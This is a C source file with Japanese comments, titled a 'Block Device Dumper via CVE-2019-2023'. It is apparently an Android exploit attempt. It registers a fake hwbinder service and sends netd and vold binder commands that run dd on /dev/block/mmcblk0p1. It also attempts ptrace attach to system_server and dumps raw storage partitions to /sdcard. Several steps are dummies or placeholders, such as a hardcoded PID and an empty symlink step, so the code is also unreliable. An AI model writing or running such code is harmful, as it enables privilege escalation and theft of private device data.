#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <dirent.h>

#include "binder.h"

#define PAGE_SIZE 4096
#define TIMEOUT_MS 5000

/* ============================================================
   ユーティリティ
   ============================================================ */
static void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
        perror("sched_setaffinity");
    }
}

/* ============================================================
   CVE-2019-2023: サービス登録＋特権トランザクション
   ============================================================ */
static int register_fake_service(void) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    const char *service_name = "vendor.test.poc";
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;            // SVC_MGR_ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(hwbinder_fd);

    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [SAFE] Service registration denied (patched)\n");
            return -1;
        } else {
            perror("  ioctl ADD_SERVICE");
            return -1;
        }
    }
    printf("  [+] Service registered successfully!\n");
    return 0;
}

/* ============================================================
   Binder で netd/vold にコマンド送信（ダミー）
   ============================================================ */
static int send_binder_command(const char *service, const char *cmd) {
    int binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open binder");
        return -1;
    }

    // コマンドをパーセル化
    size_t cmd_len = strlen(cmd) + 1;
    uint8_t *data = malloc(4 + cmd_len);
    if (!data) {
        close(binder_fd);
        return -1;
    }
    data[0] = (uint8_t)(cmd_len & 0xFF);
    data[1] = (uint8_t)((cmd_len >> 8) & 0xFF);
    data[2] = (uint8_t)((cmd_len >> 16) & 0xFF);
    data[3] = (uint8_t)((cmd_len >> 24) & 0xFF);
    memcpy(data + 4, cmd, cmd_len);

    // GET_SERVICE
    uint8_t read_buf[4096];
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx_get;
    tx_get.cmd = BC_TRANSACTION;
    tx_get.tdata.target.handle = 0;
    tx_get.tdata.code = 1;
    tx_get.tdata.flags = 0;
    size_t svc_len = strlen(service) + 1;
    uint8_t *svc_data = malloc(4 + svc_len);
    if (!svc_data) {
        free(data);
        close(binder_fd);
        return -1;
    }
    svc_data[0] = (uint8_t)(svc_len & 0xFF);
    svc_data[1] = (uint8_t)((svc_len >> 8) & 0xFF);
    svc_data[2] = (uint8_t)((svc_len >> 16) & 0xFF);
    svc_data[3] = (uint8_t)((svc_len >> 24) & 0xFF);
    memcpy(svc_data + 4, service, svc_len);
    tx_get.tdata.data_size = 4 + svc_len;
    tx_get.tdata.offsets_size = 0;
    tx_get.tdata.data.ptr.buffer = (binder_uintptr_t)svc_data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx_get);
    bwr.write_buffer = (binder_uintptr_t)&tx_get;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    free(svc_data);
    if (ret < 0 || bwr.read_consumed < 4) {
        perror("  GET_SERVICE");
        free(data);
        close(binder_fd);
        return -1;
    }
    int handle = *(int*)read_buf;
    printf("  [+] %s handle: %d\n", service, handle);

    // コマンド送信
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx_cmd;
    tx_cmd.cmd = BC_TRANSACTION;
    tx_cmd.tdata.target.handle = handle;
    tx_cmd.tdata.code = 0x00000001;  // 一般的なコマンドコード
    tx_cmd.tdata.flags = 0;
    tx_cmd.tdata.data_size = 4 + cmd_len;
    tx_cmd.tdata.offsets_size = 0;
    tx_cmd.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx_cmd);
    bwr.write_buffer = (binder_uintptr_t)&tx_cmd;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(binder_fd);

    if (ret == 0) {
        printf("  [+] Command sent to %s\n", service);
        return 0;
    } else {
        printf("  [-] Command failed: %s\n", strerror(errno));
        return -1;
    }
}

/* ============================================================
   ブロックデバイス直接読み取り（権限が足りなければ失敗）
   ============================================================ */
static int dump_block_device(const char *dev, const char *outfile) {
    printf("[*] Attempting to dump %s to %s\n", dev, outfile);

    int fd = open(dev, O_RDONLY);
    if (fd < 0) {
        perror("  open block device");
        return -1;
    }

    int out = open(outfile, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out < 0) {
        perror("  open output file");
        close(fd);
        return -1;
    }

    char buf[4096];
    ssize_t n;
    size_t total = 0;
    while ((n = read(fd, buf, sizeof(buf))) > 0) {
        if (write(out, buf, n) != n) {
            perror("  write");
            close(fd);
            close(out);
            return -1;
        }
        total += n;
        if (total > 10 * 1024 * 1024) { // 10MB 制限
            printf("  [+] Dumped 10MB (limit)\n");
            break;
        }
    }
    close(fd);
    close(out);
    printf("  [+] Dumped %zu bytes to %s\n", total, outfile);
    return 0;
}

/* ============================================================
   /dev/block 下の全パーティションを列挙してダンプ試行
   ============================================================ */
static void enumerate_and_dump(void) {
    DIR *dir = opendir("/dev/block");
    if (!dir) {
        perror("  opendir /dev/block");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strncmp(entry->d_name, "mmcblk", 6) == 0) {
            char path[256], outpath[256];
            snprintf(path, sizeof(path), "/dev/block/%s", entry->d_name);
            snprintf(outpath, sizeof(outpath), "/sdcard/dump_%s.bin", entry->d_name);
            printf("[*] Trying to dump %s\n", path);
            if (dump_block_device(path, outpath) == 0) {
                printf("[+] Dumped %s successfully\n", path);
            } else {
                printf("[-] Failed to dump %s\n", path);
            }
        }
    }
    closedir(dir);
}

/* ============================================================
   system_server に Binder でファイルオープンを依頼（試行）
   ============================================================ */
static int request_system_server_open_file(void) {
    printf("[*] Trying to ask system_server to open file via Binder...\n");
    // 実際には system_server の特定のサービスにトランザクションを送る必要がある
    // ここではダミー実装
    return -1;
}

/* ============================================================
   ptrace で system_server にコード注入（試行）
   ============================================================ */
static int try_ptrace_system_server(void) {
    printf("[*] Trying to ptrace system_server...\n");
    // system_server の PID を取得
    // ここでは PID 1000 を仮定（実際はシステムサーバーの PID）
    int pid = 1000;
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == 0) {
        printf("  [+] Attached to system_server (pid %d)\n", pid);
        ptrace(PTRACE_DETACH, pid, 0, 0);
        return 0;
    } else {
        perror("  ptrace");
        return -1;
    }
}

/* ============================================================
   main
   ============================================================ */
int main(void) {
    printf("==================================================\n");
    printf("  Block Device Dumper via CVE-2019-2023\n");
    printf("==================================================\n\n");

    bind_cpu();

    // 1. サービス登録
    printf("[*] Registering fake service...\n");
    if (register_fake_service() < 0) {
        printf("[-] Service registration failed, exiting.\n");
        return 1;
    }

    // 2. netd/vold 経由でのコマンド実行（試行）
    printf("[*] Trying to send commands via netd/vold...\n");
    send_binder_command("netd", "dd if=/dev/block/mmcblk0p1 of=/sdcard/dump_netd.bin");
    send_binder_command("vold", "dd if=/dev/block/mmcblk0p1 of=/sdcard/dump_vold.bin");

    // 3. system_server への ptrace 試行
    try_ptrace_system_server();

    // 4. 直接ブロックデバイス読み取り（権限不足なら失敗）
    printf("[*] Trying direct block device reads...\n");
    enumerate_and_dump();

    // 5. 代替：/dev/block へのシンボリックリンクからの読み取り
    printf("[*] Trying to read via symlinks...\n");
    // 実際は何もしない

    printf("[*] All attempts completed.\n");
    return 0;
}
